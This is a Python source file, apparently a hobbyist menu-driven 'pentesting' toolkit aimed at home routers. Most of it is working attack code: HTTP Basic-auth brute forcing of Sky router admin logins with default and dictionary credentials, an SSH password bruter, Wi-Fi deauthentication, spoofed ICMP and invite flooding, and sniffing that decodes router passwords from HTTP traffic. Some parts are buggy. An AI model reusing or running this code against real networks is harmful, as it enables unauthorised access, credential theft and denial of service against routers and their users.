import os
os.system("clear")

def up():
    print("""
                                           _
     _                                    | | 
    | |     ____________________________  |_|
    |_|    |                            |  _
     _     | Cheaking installed moduled | |_|
    |_|    |____________________________|
    """)
def down():
    print("""     
     _ 
    | |                                    _ 
    |_|     ____________________________  | |
           |                            | |_|
    |_|    | Cheaking installed moduled |  _
           |____________________________| |_|
    """)

up()
try:
    from colorama import Fore, Back, Style
except ModuleNotFoundError:
    print("[!] installing colorama")
    os.system("pip3 install colorama")
    os.system("pip install colorama")

os.system("clear")
down()
try:
    from urllib.request import urlopen
    from urllib.error import URLError
    import urllib.parse
except ModuleNotFoundError:
    print("[!] installing urllib")
    os.system("pip3 install urllib")
    os.system("pip install urllib")
os.system("clear")
up()
try:
    from scapy.all import *
except ModuleNotFoundError:
    print("[!] installing scapy")
    os.system("pip3 install scapy")
    os.system("pip install scapy")
os.system("clear")
down()
try:
    import paramiko
except ModuleNotFoundError:
    print("[!] installing paramiko")
    os.system("pip3 install paramiko")
    os.system("pip install paramiko")
os.system("clear")
up()

try:
    from parsel import Selector
except ModuleNotFoundError:
    print("[!] installing parsel")
    os.system("pip3 install parsel")
    os.system("pip install parsel")
os.system("clear")
down()

import socket
os.system("clear")
up()
import subprocess
os.system("clear")
down()
import base64
os.system("clear")
up()
import socket
os.system("clear")
down()
try:
    import requests
except ModuleNotFoundError:
    print("[!] installing requests")
    os.system("pip3 install requests")
    os.system("pip install requests")
os.system("clear")
up()
import sys
os.system("clear")
down()
from wpa_main import main as wpa_crack
os.system("clear")
up()
os.system("clear")
from web import main as web_main
down()
os.system("clear")
from hook import main as hook
up()
os.system("clear")
from scan import main as scan
down()
os.system("clear")
from eviltwin import main as evil

while True:
    try:
        subprocess.run("clear", shell=True)
        print(Fore.RED + """
------------------------------------------------
|0010010101110101000010001000011011100101001101|
|0001100001110010101"""+Fore.LIGHTMAGENTA_EX+"""▄████▄"""+Fore.RED+"""111101110010000110001|
|011111001110011111"""+Fore.LIGHTMAGENTA_EX+"""█      █"""+Fore.RED+"""10111010010010011110|
|00100111011010100"""+Fore.LIGHTMAGENTA_EX+"""█  ▀  ▀  █"""+Fore.RED+"""1100011111011110110|
|0001001111110111"""+Fore.LIGHTMAGENTA_EX+"""█_▄▀▄__▄▀▄_█"""+Fore.RED+"""010100000100111100|
|001111111100101"""+Fore.LIGHTMAGENTA_EX+"""▐▌  ▀    ▀  ▐▌"""+Fore.RED+"""10010000001010110|
|011100001101101"""+Fore.LIGHTMAGENTA_EX+"""█▌▀▄  ▄▄  ▄▀▐█"""+Fore.RED+"""01000001100011101|
|01101000001111"""+Fore.LIGHTMAGENTA_EX+"""▐██  ▀▀  ▀▀  ██▌"""+Fore.RED+"""1011011101000111|
|0101100111001"""+Fore.LIGHTMAGENTA_EX+"""▄████▄  ▐▌  ▄████▄"""+Fore.RED+"""111011101010111|
|1111100110001010111101010011110100010011000111|
------------------------------------------------
|                                              |
|"""+ Fore.WHITE + """ ██|   █| █|█|███|██| ██|  ██| █|  █|"""+Fore.RED + """         | 
|"""+ Fore.WHITE + """ █ █| █|█ █|█| █| █|  █ █| █|   █ █|"""+Fore.RED + """          |   
|"""+ Fore.WHITE + """ █ █| █|█ █|█| █| ██| █ █| ██|   █|"""+Fore.RED + """           | 
|"""+ Fore.WHITE + """ ██|  █|█ █|█| █| █|  ██|  █|   █ █| """+Fore.RED + """         | 
|"""+ Fore.WHITE + """ █ █|  █|  █|  █| ██| █ █| ██| █|  █|"""+Fore.RED + """         |
|                                              | 
------------------------------------------------
| """+ Fore.BLUE + """opt"""+Fore.RED + """ |"""+ Fore.BLUE + """               description"""+Fore.RED + """              |        
------------------------------------------------
| """+ Fore.GREEN + """ 1"""+Fore.RED + """  | """+ Fore.YELLOW + """exploit router to get admin"""+Fore.RED + """            |
| """+ Fore.GREEN + """ 2"""+Fore.RED + """  | """+ Fore.YELLOW + """sniff for router admin and password"""+Fore.RED + """    |
| """+ Fore.GREEN + """ 3"""+Fore.RED + """  | """+ Fore.YELLOW + """kick user off wifi"""+Fore.RED + """                     |
| """+ Fore.GREEN + """ 4"""+Fore.RED + """  | """+ Fore.YELLOW + """wpa cracker tool"""+Fore.RED + """                       |
| """+ Fore.GREEN + """ 5"""+Fore.RED + """  | """+ Fore.YELLOW + """SSH bruter"""+Fore.RED + """                             |
| """+ Fore.GREEN + """ 6"""+Fore.RED + """  | """+ Fore.YELLOW + """WEB attacker"""+Fore.RED + """                           |
| """+ Fore.GREEN + """ 7"""+Fore.RED + """  | """+ Fore.YELLOW + """hook Attack"""+Fore.RED + """                            |
| """+ Fore.GREEN + """ 8"""+Fore.RED + """  | """+ Fore.YELLOW + """mass scan"""+Fore.RED + """                              |
| """+ Fore.GREEN + """ 9"""+Fore.RED + """  | """+ Fore.YELLOW + """Evil Portal"""+Fore.RED + """                            |
| """+ Fore.GREEN + """10"""+Fore.RED + """  | """+ Fore.YELLOW + """about"""+Fore.RED + """                                  |
| """+ Fore.GREEN + """11"""+Fore.RED + """  | """+ Fore.YELLOW + """pass all traffic through tor """+Fore.RED + """           |
------------------------------------------------
        """)
        print(Style.RESET_ALL)
        co = int(input("----> "))
        print("\n\n\n")
        if co == 11:
            os.system("clear")
            print("1. start")
            print("2. stop")
            print("3. install")
            x = int(input("[#] ente choice \n----> "))
            if x == 3:
                print("[#] starting installer...")
                command = "chmod +x tor-host/install.sh"
                os.system(command)
                command = "./tor-host/install.sh"
                os.system(command)
                y = input("[#] remove install files? [y/n] ")
                if y == "y" or "Y":
                    os.system("rm -rf tor-host")
                    print("[#] files removed")
                else:
                    pass
                print("[#] done!")
            if x == 1:
                print("[#] starting...")
                command = "python3 tor-host.py -s"
                os.system(command)
                input()
            if x == 2:
                print("[#] stopping...")
                command = "python3 tor-host.py -x"
                os.system(command)
        if co == 9:
            run = True
            try:
                while run:
                    os.system("clear")
                    evil()
                    try:
                        print("\n\n[CTRL+C] press CTRL+C to exit evilportal")
                        print("[ENTER] press enter to contiue ")
                    except KeyboardInterrupt:
                        run = False
            except KeyboardInterrupt or Exception:
                try:
                    print("[CTRL+C] press CTRL+C to exit evilportal")
                    print("[ENTER] press enter to contiue ")
                except KeyboardInterrupt:
                    run = False
            '''
            command = "rfkill unblock wifi"
            os.system(command)
            command = "nmcli r wifi on"
            os.system(command)
            command = "sudo service networking restart"
            os.system(command)
            command = "sudo service network-manager restart"
            os.system(command)
            '''
            print("[#] if network manager isn't up u might need to restart")
            input("[ENTER] continue? ")
        if co == 8:
            scan()
        if co == 7:
            hook()
        if co == 6:
            web_main()
        if co == 5:
            os.system("clear")
            print("""
----------------------------
|    ___   ___   _     _   |
|   / __| / __| | |   | |  |
|   \ \   \ \   | |___| |  |
|    \ \   \ \  |  ___  |  |
|  __/ / __/ /  | |   | |  | 
| |___/ |___/   |_|   |_|  |
|                          |
----------------------------
| rank |      module       | 
----------------------------
| 9/10 | paramiko          |
----------------------------
            """)
            def _brute_():
                global host,user,wordlist;
                host = input("[#] target server (can leave blank) : ")
                p = int(input("[#] target port : "))
                user = input("[#] target user : ")
                valid = False
                while not valid:
                    try:
                        wordlist = input("[#] wordlist : ")
                        open(wordlist,"r")
                        valid = True
                    except Exception:
                        print(Fore.RED)
                        print("[!] file not found")
                        print("[!] enter full path")
                        print("EG: /home/user/file.txt\n\n")
                        print(Style.RESET_ALL)
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                f = open(wordlist,'r')
                data = f.readlines()
                len_data = len(data)
                print("[#] wordlist contain [ %s ] words."%len_data)
                print("[#] connected to target ssh [ %s ]."%host)
                print("[#] starting attack on user [ %s ]."%user)
                print("\n\n")
                for pas in data:
                    pas = pas.replace("\n","")
                    len_data -= 1
                    try:
                        ssh.connect(host,port=p,username=user, password=pas);
                        print(Fore.GREEN)
                        print("\n")
                        print("[#] password found! \nuser: %s \n password: %s "%(len_data,user,pas))
                        print(Style.RESET_ALL)
                    except paramiko.AuthenticationException:
                        pass
                        #print("[ %s ] [error] password %s is not correct."%(len_data,pas))
             
         
         
         
            try:
                _brute_();
            except KeyboardInterrupt:
                print("\n\n\t[#] operation cancelled successfully [ctrl+c] pressed.\n\n")
                sys.exit(1);
            except socket.error:
                print("\n\t[#] unable to establish connection on target ssh [ %s ]."%host)
                sys.exit(1);
            except IOError:
                print("\n [#] unable to open or read wordlist. please recheck it again.\n\n")
                sys.exit(1)
            except:

                    pass
            _brute_()
        if co == 4:
            wpa_crack()
        if co == 3:
            print(Fore.RED + """
"""+ Fore.RED +"""
-----------------------------
|"""+Fore.WHITE+"""       kick them out"""+ Fore.RED +"""       |
-----------------------------
|"""+Fore.BLUE+"""opt"""+ Fore.RED +"""|"""+Fore.BLUE+"""  description"""+ Fore.RED +"""   |"""+Fore.BLUE+""" rank"""+ Fore.RED +""" |
-----------------------------
| """+ Fore.GREEN + """1"""+ Fore.RED +""" |"""+Fore.GREEN+""" monitor mode"""+ Fore.RED +"""   |"""+Fore.GREEN+""" 9/10"""+ Fore.RED +""" |
| """+ Fore.GREEN + """2"""+ Fore.RED +""" |"""+Fore.GREEN+""" no moitor mode"""+ Fore.RED +""" |"""+Fore.GREEN+""" 1/10"""+ Fore.RED +""" |
-----------------------------
"""+Style.RESET_ALL+"""
            """)
            ch = int(input("----> "))
            if ch == 2:
                print("""
"""+Fore.WHITE+""" ENTER SCAN OPTION
"""+ Fore.RED +"""
---------------------
| """+ Fore.BLUE + """opt """+Fore.RED+"""|"""+ Fore.BLUE + """ description"""+Fore.RED+""" |
--------------------- 
| """+ Fore.GREEN+"""1"""+ Fore.RED+""" |"""+ Fore.GREEN+""" scapy"""+ Fore.RED+"""         |
| """+ Fore.GREEN+"""2 """+ Fore.RED+"""| """+ Fore.GREEN+"""enter ip """+ Fore.RED+"""     |
---------------------
"""+ Fore.YELLOW+"""
[#] make choice
"""+Style.RESET_ALL+"""
                """)
                x = int(input("----> "))
                if x == 2:
                    iptarget = input("[#] enter target ip \n----> ")
                if x == 1:
                    print("[#] scaning network")
                    target_ip = "192.168.0.1/24"

                    # print clients
                    target_ip = target_ip
                    arp = ARP(pdst=target_ip)
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = ether/arp

                    result = srp(packet, timeout=3, verbose=0)[0]
                    clients = []

                    for sent, received in result:
                        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
                    print(Fore.YELLOW)
                    print("\n\n-------------------------------------")
                    print("available devices in the network:")
                    print("")
                    print("IP" + " "*18+"MAC")
                    x = 0
                    for client in clients:
                        print(x,"{:16}    {}".format(client['ip'], client['mac']))
                        x = x + 1
                    print("\n-------------------------------------")
                    print("[#] use the numbers"+Style.RESET_ALL)
                    target = int(input("\n[#] enter target ip \n----> "))
                    t = clients[target]
                    iptarget = t['ip']
                print("""
"""+ Fore.RED +"""
---------------------
| """+ Fore.BLUE + """opt """+Fore.RED+"""|"""+ Fore.BLUE + """ description"""+Fore.RED+""" |
--------------------- 
| """+ Fore.GREEN+"""1"""+ Fore.RED+""" |"""+ Fore.GREEN+""" invite flood"""+ Fore.RED+"""  |
| """+ Fore.GREEN+"""2 """+ Fore.RED+"""| """+ Fore.GREEN+"""scapy """+ Fore.RED+"""        |
---------------------
"""+ Fore.YELLOW+"""
[#] make choice
"""+Style.RESET_ALL+"""
                """)
                x = int(input("----> "))
                if x == 1:
                    os.system("ifconfig")
                    iface = input("[#] enter interface \n----> ")
                    pkt_num = input("[#] enter packet num \n----> ")
                    command = "xterm -geometry 100x-50-0-0 -e 'inviteflood "+ iface +" 5000 Router.sploit "+ iptarget+" "+pkt_num+"'"
                    os.system("clear")
                    #print(command)
                    r = int(input("[#] enter amount of times for command to be run \n----> "))
                    r = r // 2
                    for i in range(r):
                        command = command + " | " + command
                    print("[CTRL+C] enter CTRL+C on this page when you want to quit")
                    input("[ENTER] run? ")
                    print("[#] running...")
                    os.system(command)
                    input("[ENTER] continue? ")
                    #input("d")
                if x == 2:
                    iphost = input("[#] enter fake ip to use [eg: 192.168.0.99]\n----> ")
                    s = int(input("[#] enter packet size [eg: 10000]\n----> "))
                    os.system("clear")
                    print("[#] host: ", iphost)
                    print("[#] target: ", iptarget)
                    input("[ENTER] run? ")
                    print("[#] attacking...")
                    aa = 0
                    try:
                        while True:
                            send(IP(src=iphost,dst=iptarget)/ICMP()/Raw(RandString(size=s)))
                            print("[#] sent ", aa ," packets ", end = ' ')
                            os.system("clear")
                            aa = aa + 1
                    except KeyboardInterrupt:
                        os.system("clear")
                        print("[!] done")

            if ch == 1:
                print("""
"""+Fore.WHITE+""" ENTER SCAN OPTION
"""+ Fore.RED +"""
---------------------
| """+ Fore.BLUE + """opt """+Fore.RED+"""|"""+ Fore.BLUE + """ description"""+Fore.RED+""" |
--------------------- 
| """+ Fore.GREEN+"""1"""+ Fore.RED+""" |"""+ Fore.GREEN+""" scapy"""+ Fore.RED+"""         |
| """+ Fore.GREEN+"""2 """+ Fore.RED+"""| """+ Fore.GREEN+"""enter ip """+ Fore.RED+"""     |
---------------------
"""+ Fore.YELLOW+"""
[#] make choice
"""+Style.RESET_ALL+"""
                """)
                x = int(input("----> "))
                if x == 2:
                    target_mac = int(input("\n[#] enter target mac\n----> "))
                    gateway_mac = int(input("\n[#] enter gateway mac [eg: 192.168.0.1]\n----> "))
                    os.system("ifconfig")
                    i = input("\n[#] enter interface\n----> ")
                if x == 1:
                    target_ip = "192.168.0.1/24"
                    # print clients
                    target_ip = target_ip
                    arp = ARP(pdst=target_ip)
                    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
                    packet = ether/arp

                    result = srp(packet, timeout=3, verbose=0)[0]
                    clients = []

                    for sent, received in result:
                        clients.append({'ip': received.psrc, 'mac': received.hwsrc})
                    print(Fore.YELLOW)
                    print("\n\n-------------------------------------")
                    print("available devices in the network:")
                    print("")
                    print("IP" + " "*18+"MAC")
                    x = 0
                    for client in clients:
                        print(x,"{:16}    {}".format(client['ip'], client['mac']))
                        x = x + 1
                    print("\n-------------------------------------"+Style.RESET_ALL)

                    target = int(input("\n[#] enter target mac\n----> "))
                    t = clients[target]
                    target_mac = t['mac']
                    gateway = int(input("\n[#] enter gateway mac [eg: 192.168.0.1]\n----> "))
                    g = clients[gateway]
                    gateway_mac = g['mac']
                    os.system("ifconfig")
                    i = input("\n[#] enter interface\n----> ")
                print("""
"""+ Fore.RED +"""
---------------------
| """+ Fore.BLUE + """opt """+Fore.RED+"""|"""+ Fore.BLUE + """ description"""+Fore.RED+""" |
--------------------- 
| """+ Fore.GREEN+"""1"""+ Fore.RED+""" |"""+ Fore.GREEN+""" air-crack"""+ Fore.RED+"""     |
| """+ Fore.GREEN+"""2 """+ Fore.RED+"""| """+ Fore.GREEN+"""scapy """+ Fore.RED+"""        |
---------------------
"""+ Fore.YELLOW+"""
[#] make choice
"""+Style.RESET_ALL+"""
                """)
                x = int(input("----> "))
                o = "airmon-ng start "+ i
                os.system(o)
                i = i+"mon"
                os.system("clear")
                print("[#] target: ", target_mac)
                print("[#] gateway: ", gateway_mac)
                print("[#] attacking...")
                input("[ENTER] run? ")
                if x == 1:
                    packet_num = input("[#] enter the packet num \n----> ")
                    command = "aireplay-ng --deauth ", packet_num ," -a ", gateway_mac ," -h ", target_mac ," i"
                    try:
                        os.system(command)
                    except KeyboardInterrupt:                        
                        print("[#] done!")
                        os.system("clear")
                if x == 2:
                    # 802.11 frame
                    # addr1: destination MAC
                    # addr2: source MAC
                    # addr3: Access Point MAC
                    dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
                    # stack them up
                    packet = RadioTap()/dot11/Dot11Deauth(reason=7)
                    # send the packet
                    try:
                        sendp(packet, inter=0.1, count=100, iface=i, verbose=1)
                    except KeyboardInterrupt:
                        o = "airmon-ng stop "+ i
                        os.system(o)
                        os.system("clear")
                        print("[!] done")
        if co == 10:
            print("""
[MAKER] buffkermitisagod
ABOUT:
this is a python pentesting tool for linux targiting routers
it is part of my networking project (also on github)
i will include the details of any tools i use that aren't mine
and give full credit to them. Enjoy! :)
            """)
            input("[ENTER] press enter to continue ")

        if co == 2:
            from scapy.layers.http import HTTPRequest # import HTTP packet
            e = []
            def process_packet(packet):
                global e
                try:

                    """
                    This function is executed whenever a packet is sniffed
                    """
                    show_raw = True
                    
                    if packet.haslayer(HTTPRequest):
                        # if this packet is an HTTP Request
                        # get the requested URL
                        url = packet[HTTPRequest].Host.decode() + packet[HTTPRequest].Path.decode()
                        # get the requester's IP Address
                        ip = packet[IP].src
                        # get the request method
                        method = packet[HTTPRequest].Method.decode()
                        #print(f"\n{GREEN}[#] {ip} Requested {url} with {method}{RESET}")
                        #print(packet)
                        if packet:
                            data = str(packet)
                            data = data.replace("b","")
                            data = data.replace("'","")
                            if "sky" in data:
                               # print(packet)
                               # input()
                               # print("[#] possible  sky admin login?")
                               # print("decoding...")
                               # print(data)
                                data = data.split("Authorization:")
                               # print(data)
                               # input("HH")
                                r = data[1]
                                r = r.replace("Basic","")
                                r = r.replace(" ","")
                                r = r.replace("\n","")
                                rrr = r.encode('ascii')
                                rr = base64.b64decode(rrr)
                                print(Fore.GREEN)
                                print("[#] got sky router user and password!")
                                rr = str(rr)
                                rr = rr.replace("b'","")
                                rr = rr.replace('b"','')
                                rr = rr.replace("'","")
                                rr = rr.split('\\')
                                print(rr[0])
                                e = e.append(rr[0])
                                print("\n")
                                print(Style.RESET_ALL)
                            else:
                                pass
                            if show_raw and packet.haslayer(Raw) and method == "POST":
                                # if show_raw flag is enabled, has raw data, and the requested method is "POST"
                                # then show raw
                                #print(f"\n{RED}[#] Some useful Raw data: {packet[Raw].load}{RESET}")
                                pass
                except KeyboardInterrupt:
                    return e
                except Exception:
                    pass
                        #print(Fore.RED)
                        #print("[!] Fatal Error Skipping this HTTP request")
                        #print(Style.RESET_ALL)
                            
            def sniff_packets(iface=None):
                if iface:
                    # port 80 for http (generally)
                    # `process_packet` is the callback
                    sniff(filter="port 80", prn=process_packet, iface=iface, store=False)
                else:
                    # sniff with default interface
                    sniff(filter="port 80", prn=process_packet, store=False, )
            

            if __name__ == "__main__":
                subprocess.run("ifconfig", shell=True)
                iface = input("\n[#] enter interface \n----> ")
                print("[#] running\n\n")
                sniff_packets(iface)
        if co == 1:
            def attack_main(u, pa):
                t = 2
                ex = "Unauthorised"
                while t != 0:
                    buffer_size = 8192
                    HOST = '192.168.0.1' 
                    PORT = 80    
                    print("[#] connecting to router")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                    both = u+":"+pa
                    both = both.encode()
                    pas = base64.b64encode(both)
                    pass_enc = str(pas)
                    pass_enc = pass_enc.replace("b'","")
                    pass_enc = pass_enc.replace("'","")
                    rr = "Authorization: Basic "+pass_enc
                    data = ["GET /sky_router_status.html HTTP/1.1",
                    "Host: 192.168.0.1",
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                    "Upgrade-Insecure-Requests: 1",
                    "DNT: 1",
                    "Sec-GPC: 1",
                    rr]
                    r = '\r\n'.join(data)+'\r\n\r\n'
                    print("[#] sending data...")
                    s.send(r.encode())
                    print("[#] recv...")
                    r = s.recv(buffer_size)
                    s.close()
                    chk = r.decode()
                    print("[#] cheking")
                    if ex not in chk:
                        os.system("clear")
                        print(Fore.GREEN)
                        subprocess.run("clear", shell=True)
                        print("[#] user and password Found1")
                        print("===========================")
                        print("USER : ", use)
                        print("PASS : ", pa)
                        print("===========================")
                        print(Style.RESET_ALL)
                        input("[ENTER] hit enter to continue ")
                        y = False
                        t = 0
                        return y, valid
                    else:
                        print("[!] not found \n[!] dubble checking...")
                        t = t - 1
            def attack_brute(u, pa):
                t = 2
                ex = "Unauthorised"
                while t != 0:
                    buffer_size = 8192
                    HOST = '192.168.0.1' 
                    PORT = 80    
                    print("[#] connecting to router")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                    both = u+":"+pa
                    both = both.encode()
                    pas = base64.b64encode(both)
                    pass_enc = str(pas)
                    pass_enc = pass_enc.replace("b'","")
                    pass_enc = pass_enc.replace("'","")
                    rr = "Authorization: Basic "+pass_enc
                    data = ["GET /sky_router_status.html HTTP/1.1",
                    "Host: 192.168.0.1",
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                    "Upgrade-Insecure-Requests: 1",
                    "DNT: 1",
                    "Sec-GPC: 1",
                    rr]
                    r = '\r\n'.join(data)+'\r\n\r\n'
                    print("[#] sending data...")
                    s.send(r.encode())
                    print("[#] recv...")
                    r = s.recv(buffer_size)
                    s.close()
                    chk = r.decode()
                    print("[#] cheking")
                    if ex not in chk:
                        os.system("clear")
                        print(Fore.GREEN)
                        subprocess.run("clear", shell=True)
                        print("[#] user and password Found1")
                        print("===========================")
                        print("USER : ", use)
                        print("PASS : ", pa)
                        print("===========================")
                        print(Style.RESET_ALL)
                        input("[ENTER] hit enter to continue ")
                        found = True
                        t = 0
                        return found
                    else:
                        print("[!] not found \n[!] dubble checking...")
                        t = t - 1
            def attack(u, pa):
                t = 2
                ex = "Unauthorised"
                while t != 0:
                    buffer_size = 8192
                    HOST = '192.168.0.1' 
                    PORT = 80    
                    print("[#] connecting to router")
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((HOST, PORT))
                    both = u+":"+pa
                    both = both.encode()
                    pas = base64.b64encode(both)
                    pass_enc = str(pas)
                    pass_enc = pass_enc.replace("b'","")
                    pass_enc = pass_enc.replace("'","")
                    rr = "Authorization: Basic "+pass_enc
                    data = ["GET /sky_router_status.html HTTP/1.1",
                    "Host: 192.168.0.1",
                    "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
                    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language: en-US,en;q=0.5",
                    "Accept-Encoding: gzip, deflate",
                    "Connection: keep-alive",
                    "Upgrade-Insecure-Requests: 1",
                    "DNT: 1",
                    "Sec-GPC: 1",
                    rr]
                    r = '\r\n'.join(data)+'\r\n\r\n'
                    print("[#] sending data...")
                    s.send(r.encode())
                    print("[#] recv...")
                    r = s.recv(buffer_size)
                    s.close()
                    chk = r.decode()
                    print("[#] cheking")
                    if ex not in chk:
                        os.system("clear")
                        print(Fore.GREEN)
                        subprocess.run("clear", shell=True)
                        print("[#] user and password Found1")
                        print("===========================")
                        print("USER : ", use)
                        print("PASS : ", pa)
                        print("===========================")
                        print(Style.RESET_ALL)
                        input("[ENTER] hit enter to continue ")
                        y = False
                        valid = True
                        t = 0
                        return y, valid
                    else:
                        print("[!] not found \n[!] dubble checking...")
                        t = t - 1
            print("[#] detecting provider")
            num = 0
            ### Crawling to the website fetch links and images -> store images -> crawl more to the fetched links and scrap more images
            all_images  = {} # website links as "keys" and images link as "values"
            # GET request to recurship site
            url = "http://192.168.0.1"
            router = 0
            response = requests.get(url)
            selector = Selector(response.text)
            href_links = selector.xpath('//a/@href').getall()
            image_links = selector.xpath('//img/@src').getall()
            detect = False
            for link in href_links:
                try:
                    response = requests.get(link)
                    if response.status_code == 200:
                        image_links = selector.xpath('//img/@src').getall()
                        all_images[link] = image_links
                        num = num + 1
                except Exception:
                    if detect != True:
                        if "sky_" in link:
                            print("[#] found provider")
                            print("[provider] provider = sky")
                            router = "192.168.0.1/sky_router_status.html"
                            #router = 1
                            detect = True
                        else:
                            print("[!] unkown provider")
                            print("[!] make sure it's not an 3rd part extention that you have connected to")
                            print("[!] curently supports: \nsky \n")
                            #router = 0
                            detect = False
                    else:
                        pass
            if detect == True:
                router = "192.168.0.1"
                print("[#] trying default user and pass")
                valid = False
                y = True
                if 1 == 1: #indetnt make easir to read
                    use = "admin"
                    pa = "sky"
                    print("[#] cheking defualt")
                    y, valid = attack(use, pa)
                        
                if len(router) >= 1:
                    if y == True:
                        os.system("clear")
                        print("[!] it's not the default")
                        print("router url: ", router)
                        print("1) dicontery attack")
                        print("2) brute force")
                        c = int(input("[#] enter choice \n----> "))
                        if c == 2:
                            if y == True:
                                PASSWORD_LIST = itertools.product('0123456789qwertyuiopasdfghjklzxcvbnm', repeat=8) #0123456789ABCDEF
                                x = 0
                                found = False
                                try:
                                    for pas in PASSWORD_LIST:
                                        pas = str(pas)
                                        pas = pas.replace("')","")
                                        pas = pas.replace("('","")
                                        pas = pas.replace("'","")
                                        pas = pas.replace(",","")
                                        pas = pas.replace(" ","")
                                        u = str(pas)
                                        for pss in PASSWORD_LIST:
                                            os.system("clear")
                                            pss = str(pss)
                                            pss = pss.replace("')","")
                                            pss = pss.replace("('","")
                                            pss = pss.replace("'","")
                                            pss = pss.replace(",","")
                                            pss = pss.replace(" ","")
                                            pa = str(pss)
                                            os.system("clear")
                                            print("user: ", u)
                                            print("pass: ", pa)
                                            print("attempt: ", x)
                                            found = attack_brute(u, pa)
                                            if found == True:
                                                print("[!] user and password found quiting....")
                                                q = y + o
                                except Exception:
                                    pass
                                except KeyboardInterrupt:
                                    print(Fore.RED)
                                    os.system("clear")
                                    print("[!] user interupt")
                                    print("[!] last used")
                                    print("user: ", u)
                                    print("pass: ", pa)
                                    print("attempt: ", x)
                                    print(Style.RESET_ALL)
                                    input("[ENTER] continue? ")
                                    
                        if c == 1:
                            while not valid:
                                try:
                                    user = input("enter user file : ")
                                    passwords = input("enter pass file : ")
                                    user = open(user,"r").readlines()
                                    pas = open(passwords,"r").readlines()
                                    valid = True
                                except Exception:
                                    print(Fore.RED)
                                    print("[!] file not found!")
                                    print("[!] enter the full file with path")
                                    print("EG: /home/user/file.txt")
                                    print(Style.RESET_ALL)
                            x = 0
                            s = 0
                            at = 0
                            us = 0
                            while y:
                                try:
                                    use = user[x]
                                    use = use.replace("\n","")
                                    if us == 0:
                                        print("[#] trying user : ", user[x])
                                        us = 1
                                    else:
                                        pass
                        
                                except IndexError:
                                    print("[!] all users or tried")
                                    y = False
                                try:   
                                    pa = pas[s]
                                    pa = pa.replace("\n","")
                                except IndexError:
                                    s = 0
                                    x = x + 1
                                    us = 0
                                    print("[!] moving on to next user")
                                at = at + 1
                                y = attack_main(use, pa)
                                s = s + 1
            else:
                print("[!]")
    except KeyboardInterrupt:
        try:
            print("\n\n[CTRL+C] are you sure? ")
            input("[CTRL+C] press agin if you want to exit if not hit enter ")
        except KeyboardInterrupt:
            subprocess.run("clear", shell=True)
            quit()
        subprocess.run("clear", shell=True)
